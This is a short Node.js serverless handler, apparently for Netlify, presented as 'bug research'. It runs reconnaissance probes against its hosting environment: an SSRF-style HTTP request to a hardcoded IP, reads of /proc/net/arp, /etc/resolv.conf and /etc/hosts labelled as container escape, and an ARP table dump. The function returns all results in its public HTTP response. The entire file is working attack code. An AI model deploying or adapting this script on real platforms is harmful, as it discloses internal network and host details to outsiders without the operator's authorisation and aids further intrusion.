const fs = require('fs');
const http = require('http');

exports.handler = async (event, context) => {
  const bugReport = {};

  // --- PROBE 1: SSRF to Internal Netlify API ---
  const checkInternal = (ip) => new Promise((resolve) => {
    const req = http.get(`http://${ip}/`, { timeout: 2000 }, (res) => {
      resolve({
        status: res.statusCode,
        headers: res.headers
      });
    });
    req.on('error', (e) => resolve(`Failed: ${e.message}`));
  });

  bugReport.ssrf_test = await checkInternal('18.208.88.157');

  // --- PROBE 2: Container Escape / Directory Traversal ---
  const secretPaths = [
    '/proc/net/arp',
    '/etc/resolv.conf',
    '/etc/hosts'
  ];

  bugReport.file_leak = {};
  secretPaths.forEach(p => {
    try {
      bugReport.file_leak[p] = fs.readFileSync(p, 'utf8').substring(0, 200);
    } catch (e) {
      bugReport.file_leak[p] = `Denied: ${e.message}`;
    }
  });

  // --- PROBE 3: ARP Table (Network Disclosure) ---
  try {
    bugReport.arp_table = fs.readFileSync('/proc/net/arp', 'utf8');
  } catch (e) {
    bugReport.arp_table = "Forbidden";
  }

  console.log('--- BUG RESEARCH LOG ---');
  console.log(JSON.stringify(bugReport, null, 2));
  await new Promise(r => setTimeout(r, 500)); 

  return {
    statusCode: 200,
    body: JSON.stringify({ 
        research_status: "Complete", 
        evidence: bugReport 
    }, null, 2)
  };
};
